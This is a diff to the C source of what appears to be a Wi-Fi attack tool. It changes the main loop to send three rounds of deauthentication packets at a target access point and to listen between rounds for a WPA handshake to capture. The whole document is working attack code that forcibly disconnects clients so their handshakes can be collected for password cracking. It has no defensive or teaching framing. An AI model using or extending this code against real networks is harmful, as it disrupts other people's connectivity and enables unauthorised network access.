@@ -410,17 +410,30 @@ int main(int argc, char *argv[]) {
     // Send deauth packets if enabled
     if (opts.deauth) {
         log_info("Sending deauthentication packets to force handshake...");
-        int deauth_count = 20;  // Send 20 deauth packets
-        int sent = scanner_send_deauth(&cap, scanner.target_bssid, NULL, deauth_count);
-        log_info("Sent %d deauth packets", sent);
 
-        // Wait a moment for devices to reconnect
-        usleep(2000000); // 2 seconds
+        // Send 3 rounds of deauth with waits in between
+        for (int round = 0; round < 3; round++) {
+            if (!running) break;
 
-        // Send another round
-        log_info("Sending more deauth packets...");
-        sent = scanner_send_deauth(&cap, scanner.target_bssid, NULL, deauth_count);
-        log_info("Sent %d deauth packets", sent);
+            log_info("  Deauth round %d/3...", round + 1);
+            int sent = scanner_send_deauth(&cap, scanner.target_bssid, NULL, 30);
+            log_info("  Sent %d deauth packets", sent);
+
+            // Wait for reconnection
+            if (round < 2) {
+                log_info("  Waiting for reconnection...");
+                time_t wait_start = time(NULL);
+                while (running && (time(NULL) - wait_start) < 3) {
+                    uint8_t buf[MAX_PACKET_SIZE];
+                    int len = capture_packet(&cap, buf, sizeof(buf), 500);
+                    if (len > 0) {
+                        scanner_packet_callback(buf, len, &scanner);
+                        if (handshake_is_complete(&handshake)) break;
+                    }
+                }
+                if (handshake_is_complete(&handshake)) break;
+            }
+        }
     }
 
     log_info("Listening for handshake... (Press Ctrl+C to stop)");
